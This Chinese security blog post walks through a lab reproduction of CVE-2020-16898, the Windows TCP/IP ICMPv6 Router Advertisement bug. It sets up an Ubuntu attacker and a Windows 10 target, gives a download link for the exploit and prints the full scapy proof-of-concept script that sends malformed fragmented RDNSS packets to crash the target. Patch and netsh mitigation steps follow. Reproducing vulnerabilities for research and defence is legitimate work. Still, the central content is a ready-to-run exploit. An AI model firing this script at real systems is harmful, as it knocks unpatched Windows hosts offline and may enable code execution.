\> 本文由 \[简悦 SimpRead\](http://ksria.com/simpread/) 转码， 原文地址 \[mp.weixin.qq.com\](https://mp.weixin.qq.com/s/RTdkBbXWdzIBFpExZszQkg)

  

**上方蓝色字体关注我们，一起学安全！**

**作者：****DesM0nd****@Timeline Sec  
**

**本文字数：1404**

**阅读时长：3～4min**

**声明：请勿用作违法用途，否则后果自负**

**0x01 简介**  

  

TCP/IP 是指能够在多个不同网络间实现信息传输的协议簇。TCP/IP 协议不仅仅指的是 TCP 和 IP 两个协议，而是指一个由 FTP、SMTP、TCP、UDP、IP 等协议构成的协议簇，只是因为在 TCP/IP 协议中 TCP 协议和 IP 协议最具代表性，所以被称为 TCP/IP 协议。

**0x02 漏洞概述**  

  

**编号：CVE-2020-16898**  
远程攻击者通过构造特制的 ICMPv6 Router Advertisement（路由通告）数据包，并将其发送到远程 Windows 主机上，即可在目标主机上执行任意代码。要利用此漏洞，攻击者必须将特制的 ICMPv6 路由器广告数据包发送到远程 Windows 计算机。  

**触发条件**

*   仅当源地址是本地链接的 IPv6 时，才能利用此 bug。
    
*   整个有效负载必须是有效的 IPv6 数据包。如果您将标头弄得太多，触发触发错误之前，您的数据包将被拒绝
    
*   在验证数据包大小的过程中，可选标头中所有定义的 “长度” 必须与数据包大小匹配
    
*   此漏洞允许走私额外的 “标题”。此标头未经验证，并且包含“长度” 字段。触发错误后，无论如何都会根据数据包大小检查此字段。
    
*   需要绕过 Windows NDIS API 可以触发错误
    

**0x03 影响版本**  

  

Microsoft:window\_server\_2019:/1903/1909/2004

Microsoft:window\_server\_2019:\*

Microsoft:window\_server:1903/1909/2004  

**0x04 环境搭建**  

  

**攻击机：Ubuntu**

（python 版本：3.7，安装了 scapy 依赖）

```
pip install scapy
```

攻击机的 IPv6 为  

```
fe80::b1b3:3a5a:b16d:3385
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgSyZZnRA8juZ4LnyeuakhbE1g4SOuV4ojyEjYTSPRsx8S97zOVyUibwKKicQejNGtHhOTyAicLAhRDw/640?wx_fmt=png)  

------------------------------------------------------------------------------------------------------------------------------------------------

**漏洞环境机：Windows 10 1903  
**

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgSyZZnRA8juZ4Lnyeuakhbib1ahSdXuybdk6sX3rP9ZRRZE0hCb01E2Ttamt0ICpcpz93jTicDjP4g/640?wx_fmt=png)

漏洞环境机子需要开启 ipv6  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgSyZZnRA8juZ4LnyeuakhbR8FeqOtr4FnTic4UStQOwsj8FicSU5icicGFibu8RV0iajiaib4YxiaJ7HWlJRg/640?wx_fmt=png)

使用 cmd 的 ipconfig 查看  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgSyZZnRA8juZ4Lnyeuakhb2CKLgibAWLHDSAyCr6xVD85aibDK6G4EKOOMEN9VWa5Y3jnSlKdJkn2g/640?wx_fmt=png)

现在漏洞环境里 IPv6 地址为

```
fdb2:2c26:f4e4:0:2d3a:7f28:92af:3192
```

漏洞环境机选用的 ipv6 地址为 ipv6 地址或临时 ipv6 地址，攻击机选用的 ipv6 地址为本地链接 ipv6 地址，攻击机与受害机网络要通，可尝试 ping 一下  

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgSyZZnRA8juZ4Lnyeuakhbbkz1xC0pNyOT3JhiasNQVMmaOraT10yBacquiao8nqPSib2M0PSHseOMA/640?wx_fmt=png)

**0x05 漏洞复现**  

  

EXP 下载地址：

http://site.pi3.com.pl/exp/p\_CVE-2020-16898.py  

```
#!/usr/bin/env python3
#
# Proof-of-Concept / BSOD exploit for CVE-2020-16898 - Windows TCP/IP Remote Code Execution Vulnerability
#
# Author: Adam 'pi3' Zabrocki
# http://pi3.com.pl
#

from scapy.all import \*

v6\_dst = "fd12:db80:b052:0:7ca6:e06e:acc1:481b"
v6\_src = "fe80::24f5:a2ff:fe30:8890"

p\_test\_half = 'A'.encode()\*8 + b"\\x18\\x30" + b"\\xFF\\x18"
p\_test = p\_test\_half + 'A'.encode()\*4

c = ICMPv6NDOptEFA();

e = ICMPv6NDOptRDNSS()
e.len = 21
e.dns = \[
"AAAA:AAAA:AAAA:AAAA:FFFF:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA",
"AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA:AAAA" \]

pkt = ICMPv6ND\_RA() / ICMPv6NDOptRDNSS(len=8) / \\
      Raw(load='A'.encode()\*16\*2 + p\_test\_half + b"\\x18\\xa0"\*6) / c / e / c / e / c / e / c / e / c / e / e / e / e / e / e / e

p\_test\_frag = IPv6(dst=v6\_dst, src=v6\_src, hlim=255)/ \\
              IPv6ExtHdrFragment()/pkt

l=fragment6(p\_test\_frag, 200)

for p in l:
    send(p)
```

修改 exp 中的 v6\_dst 以及 v6\_src

```
v6\_dst = "fdb2:2c26:f4e4:0:2d3a:7f28:92af:3192"
v6\_src = "fe80::b1b3:3a5a:b16d:3385"
```

```
sudo python3.7 p\_CVE-2020-16898.py
```

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsgSyZZnRA8juZ4LnyeuakhbN2Eaib2jNc52rlnwZ6rYJhd0PPIKH7cY1yF8vEn5reibibIWyWKrjK0tQ/640?wx_fmt=png)

**0x06 修复方式**  

  

1、升级更新。立即安装针对此漏洞的更新，下载最新的补丁包进行更新修复，如下链接：

```
https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898
```

2、不能升级的话，先禁用基于 RA 的 DNS 配置 CMPv6 RDNSS

使用以下 PowerShell 命令禁用 ICMPv6 RDNSS，以防止攻击者利用此漏洞。此解决方法仅适用于 Windows 1709 及更高版本。

```
netsh int ipv6 set int \*INTERFACENUMBER\* rabaseddnsconfig=disable
```

注意：进行更改后，无需重新启动。  

```
参考链接：
```

https://portal.msrc.microsoft.com/en-US/security-guidance/advisory/CVE-2020-16898

http://blog.pi3.com.pl/?p=780

https://blog.csdn.net/qq\_22807425/article/details/109448911

**作者博客：  
**

**https://www.yuque.com/desm0nd/osrdpc**

Timeline Sec 发起了一个读者讨论 1、复现讨论 2、期待文章 3、点赞支持

![](https://mmbiz.qpic.cn/mmbiz_png/VfLUYJEMVsiaASAShFz46a4AgLIIYWJQKpGAnMJxQ4dugNhW5W8ia0SwhReTlse0vygkJ209LibhNVd93fGib77pNQ/640?wx_fmt=png)

  

![](https://mmbiz.qpic.cn/mmbiz_jpg/VfLUYJEMVshAoU3O2dkDTzN0sqCMBceq8o0lxjLtkWHanicxqtoZPFuchn87MgA603GrkicrIhB2IKxjmQicb6KTQ/640?wx_fmt=jpeg)

**阅读原文看更多复现文章  
**

Timeline Sec 团队  

安全路上，与你并肩前行